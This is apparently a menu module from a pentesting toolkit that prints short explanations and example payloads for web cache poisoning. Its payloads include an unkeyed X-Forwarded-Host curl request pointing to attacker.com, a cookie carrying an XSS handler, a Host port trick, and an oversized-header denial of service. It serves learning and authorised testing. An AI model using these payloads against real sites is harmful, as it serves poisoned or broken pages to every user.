#!/bin/bash
# HackTricks Ref: cache-poisoning
# Module: Web Cache Poisoning (Infrastructure Logic)

echo -e "${C6}[WEB ATTACK: CACHE_POISONING]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/cache-poisoning"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Cache Poisoning Vector:${NC}"
echo "1) Unkeyed Header Injection (X-Forwarded-Host)"
echo "2) Cookie-Based Cache Poisoning"
echo "3) Path Mapping / Route Poisoning"
echo "4) Cache Key Flaws (Unkeyed Port/Query)"
echo "5) CPDoS (Cache-Provided Denial of Service)"
echo "0) Exit"

read -p "Selection: " cache_opt

case $cache_opt in
    1)
        echo -e "\n${C2}[*] Unkeyed Header Injection:${NC}"
        echo "The 'X-Forwarded-Host' is often unkeyed (not part of the cache key)."
        echo "Payload: curl -H \"X-Forwarded-Host: attacker.com\" https://target.com/static/js"
        echo "If the server uses this header to generate absolute URLs in the response,"
        echo "the cache will store the link to attacker.com for all users."
        ;;
    2)
        echo -e "\n${C2}[*] Cookie-Based Poisoning:${NC}"
        echo "If a cookie like 'fe_typo_user' is used to set a language or theme but isn't keyed:"
        echo "Payload: Cookie: fe_typo_user=id-ID\" onmouseover=\"alert(1)\""
        echo "The injected XSS will be cached and served to everyone."
        ;;
    3)
        echo -e "\n${C2}[*] Route Poisoning:${NC}"
        echo "Exploit differences between how the cache and the backend parse the URL."
        echo "Try: /path?cb=123 (Cache Buster) to test without affecting real users."
        echo "Try: /invalid-path (if the 404 page is cached and reflects input)."
        ;;
    4)
        echo -e "\n${C2}[*] Cache Key Flaws:${NC}"
        echo "Check if the port is ignored in the key:"
        echo "  Host: target.com:8080"
        echo "If the backend redirects to 'target.com:8080' and the cache saves it for 'target.com',"
        echo "you can break the site for everyone."
        ;;
    5)
        echo -e "\n${C2}[*] CPDoS (Cache-Provided DoS):${NC}"
        echo "Send an oversized header (e.g., X-Oversized: [8KB of A's])."
        echo "The backend returns a 400 Bad Request. If the cache stores this 400,"
        echo "the page becomes inaccessible to everyone."
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
